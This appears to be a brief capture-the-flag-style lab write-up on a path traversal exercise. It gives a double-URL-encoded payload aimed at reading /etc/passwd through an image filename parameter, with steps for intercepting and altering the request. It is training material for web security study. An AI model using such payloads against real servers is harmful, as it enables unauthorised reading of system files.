# Lab 04

## Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

**Vulnerable Path:** ..%252f..%252f..%252fetc/passwd

**Step-by-step:**
1. Intercept product
2. FORWARD until get vulnerable parameter (/image?filename=.jpg)
3. Replace .jpg with ..%252f..%252f..%252fetc/passwd

![e7d4498fa84b4f728acef2c18442e6dd](https://user-images.githubusercontent.com/44063862/106375459-24aea880-63c7-11eb-97d3-8cbe4071b6da.png)
